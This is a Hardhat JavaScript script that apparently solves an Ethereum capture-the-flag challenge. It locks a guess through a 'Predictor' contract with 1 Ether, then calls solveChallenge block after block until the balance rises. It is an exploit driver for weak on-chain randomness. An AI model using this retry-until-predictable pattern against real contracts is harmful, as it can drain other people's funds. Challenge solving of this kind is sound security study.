const hre = require("hardhat")
const { BigNumber } = hre.ethers

require("dotenv").config()

// The purpose of this script is to launch a transaction that is getting included 
// in every possible block until my 2 Ether are recaptured.
// To do this I need to:
// - first deploy my predictor contract

let tx;
let txResult;
let oldBlock;
let newBlock;
let oldBalance;
let newBalance;

const predictorAddress = process.env.PREDICTOR

const getBalance = async (address) => {
    let balance = await hre.ethers.provider.getBalance(address)
    return balance
}

const getBlockNumber = async () => {
    let block = await hre.ethers.provider.getBlock()
    return block.number
}

const sleep = ms => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const lockNumber = async (contract) => {

    let overrides = {
        value: hre.ethers.utils.parseEther("1.0")
    }

    // Overrides allow us in this situation to force the transaction to be mined
    // since the pre-execution doesn't launch a TX because of the require statement
    // at solveChallenge at Predictor.sol
    let tx = await contract.lockNumber(overrides)
    console.log("Creating 'lock' transaction. ")
    await tx.wait()
    console.log("'Lock' transaction is mined")
}

const main = async () => {

    const overrides = {
        gasLimit: hre.ethers.utils.parseUnits("15.0", "mwei")
    }

    oldBlock = await getBlockNumber()
    newBlock = oldBlock
    
    const Contract = await hre.ethers.getContractFactory("Predictor")
    const signer = await hre.ethers.getSigner()

    const predictor = new ethers.Contract(
        predictorAddress,
        Contract.interface,
        signer
    )

    oldBalance = await getBalance(predictorAddress)
    newBalance = oldBalance

    await lockNumber(predictor)

    console.log("Initiated loop")
    while (newBlock <= oldBlock + 50) {
        
        try {
            tx = await predictor.solveChallenge(overrides)
            txResult = await tx.wait()
            console.log("Transaction passed at: ", newBlock)
        } catch(error) {
            console.log("Transaction failed at block: ", newBlock, "Balance predictor: ", newBalance)
        }

        newBalance = await getBalance(predictorAddress)

        if (newBalance.gt(oldBalance)) {
            console.log("Iteration is finished. Ether transfer was successful")
            break;
        } else {
            oldBalance = newBalance
        }
        
        newBlock = await getBlockNumber()
        await sleep(8000)
    }

    console.log("Depending on the last message you shoul run the script again")
}


main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
